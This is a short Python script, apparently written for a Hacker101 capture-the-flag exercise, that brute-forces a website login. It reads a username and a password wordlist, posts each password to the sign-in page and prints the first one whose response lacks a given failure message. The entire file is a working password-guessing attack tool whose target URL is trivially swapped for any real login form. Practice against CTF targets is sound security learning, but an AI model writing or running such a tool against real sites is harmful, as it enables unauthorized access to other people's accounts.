import requests, sys

if(len(sys.argv) != 4):
	print('Usage: ./login_brutorcer.py <USERNAME> <PASSWORD_WORDLIST> <RESPONSE_CHECK>')
	exit()

url = "https://99838d4e342bd1742c0030fa9235d131.ctf.hacker101.com/index.php?page=sign_in.php"

user = sys.argv[1]
wordlist = sys.argv[2]
file = open(wordlist, "r")
passwords = file.readlines()
response = sys.argv[3]

def bruteforce_login(pasw):
	data = {
		"username": user,
		"password": pasw
	}
	req = requests.post(url, data=data)
	if response not in req.text:
		print("user: "+user+"\npassword: "+pasw)
		exit()

for p in passwords:
	bruteforce_login(p.strip())
